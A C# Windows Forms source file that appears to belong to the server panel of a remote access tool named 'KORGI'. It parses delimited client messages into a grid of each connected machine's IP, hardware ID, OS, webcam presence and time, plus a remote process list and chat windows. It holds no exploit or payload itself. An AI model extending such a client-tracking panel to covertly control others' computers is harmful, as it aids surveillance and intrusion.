using Server.Forms;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace Server
{
    class HandleForm
    {
        static int i = 0;
        private static Image returnImage;

        ///<summary>
        ///  Add Log Into ListView
        ///</summary>
        public static void Task(string[] proces)
        {
            string name = "", id = "";
            foreach (string s in proces)
            {
                name = s.Split(new string[] { "[KORGI]" }, StringSplitOptions.None)[0];
                id = s.Split(new string[] { "[KORGI]" }, StringSplitOptions.None)[1];
                AddTask(new string[] { name, id });
            }
        }
        private static void AddTask(string[] task)
        {
            try
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = task[0];

                foreach (string s in task)
                {
                    lvi.SubItems.Add(s);
                }
                lvi.ForeColor = Color.FromArgb(128, 0, 255);

                if (Form1.ftm.InvokeRequired)
                {
                    Form1.ftm.Invoke((MethodInvoker)(() =>
                    {
                        Form1.ftm.listView1.Items.Insert(0, lvi);
                    }));
                }
                else
                {
                    Form1.ftm.listView1.Items.Insert(0, lvi);
                }
               
                
            }
            catch { }
        }

        public static void WriteTextBox(Socket sck, string msg)
        {
            try
            {
                if (Program.korgi.InvokeRequired)
                {
                    Program.korgi.Invoke((MethodInvoker)(() =>
                    {
                        Program.korgi.richTextBox1.SelectionColor = Color.Red;
                        Program.korgi.richTextBox1.SelectedText = Environment.NewLine + sck.RemoteEndPoint.ToString() + " : ";
                        Program.korgi.richTextBox1.SelectionColor = Color.FromArgb(128, 0, 255);
                        Program.korgi.richTextBox1.SelectedText = msg;
                    }));
                }
                else
                {
                    Program.korgi.richTextBox1.SelectionColor = Color.Red;
                    Program.korgi.richTextBox1.SelectedText = Environment.NewLine + sck.RemoteEndPoint.ToString() + " : ";
                    Program.korgi.richTextBox1.SelectionColor = Color.FromArgb(128, 0, 255);
                    Program.korgi.richTextBox1.SelectedText = msg;
                }
            }
            catch
            {

            }
        }


        public static void Insert(string text)
        {
            string[] lines = text.Split(new string[] { "[KORGI]" }, StringSplitOptions.None);
            string id = lines[0];
            string name = lines[1];
            string ip = lines[2];
            string hwid = lines[3];
            string os = lines[4];
            string cam = lines[5];
            string time = lines[6];

            if (Program.korgi.InvokeRequired)
            {
                Program.korgi.Invoke((MethodInvoker)(() =>
                {
                    int rowId = Program.korgi.dataGridView1.Rows.Add();

                    DataGridViewRow row = Program.korgi.dataGridView1.Rows[rowId];
                    row.DefaultCellStyle.ForeColor = Color.Cyan;
                    row.Cells["Column1"].Value = id;
                    row.DefaultCellStyle.ForeColor = Color.FromArgb(100,0, 255);
                    row.Cells["Column2"].Value = name;
                    row.Cells["Column3"].Value = ip;
                    row.Cells["Column4"].Value = hwid;
                    row.Cells["Column5"].Value = os;
                    row.Cells["Column6"].Value = cam;
                    row.Cells["Column7"].Value = time;
                }));
            }
            else
            {
                int rowId = Program.korgi.dataGridView1.Rows.Add();

                DataGridViewRow row = Program.korgi.dataGridView1.Rows[rowId];
                row.Cells["Column1"].Value = id;
                row.Cells["Column2"].Value = name;
                row.Cells["Column3"].Value = ip;
                row.Cells["Column4"].Value = hwid;
                row.Cells["Column5"].Value = os;
                row.Cells["Column6"].Value = cam;
                row.Cells["Column7"].Value = time;
            }

        }


        public static void WriteTextBoxChat(Socket sck, string msg)
        {
            try
            {
                if (Form1.chat.InvokeRequired)
                {
                    Form1.chat.Invoke((MethodInvoker)(() =>
                    {
                        Form1.chat.richTextBox1.SelectionColor = Color.Red;
                        Form1.chat.richTextBox1.SelectedText = Environment.NewLine + sck.RemoteEndPoint.ToString() + " : ";
                        Form1.chat.richTextBox1.SelectionColor = Color.FromArgb(128, 0, 255);
                        Form1.chat.richTextBox1.SelectedText = msg;
                    }));
                }
                else
                {
                    Form1.chat.richTextBox1.SelectionColor = Color.Red;
                    Form1.chat.richTextBox1.SelectedText = Environment.NewLine + sck.RemoteEndPoint.ToString() + " : ";
                    Form1.chat.richTextBox1.SelectionColor = Color.FromArgb(128, 0, 255);
                    Form1.chat.richTextBox1.SelectedText = msg;
                }
            }
            catch
            {

            }
        }


    }
}
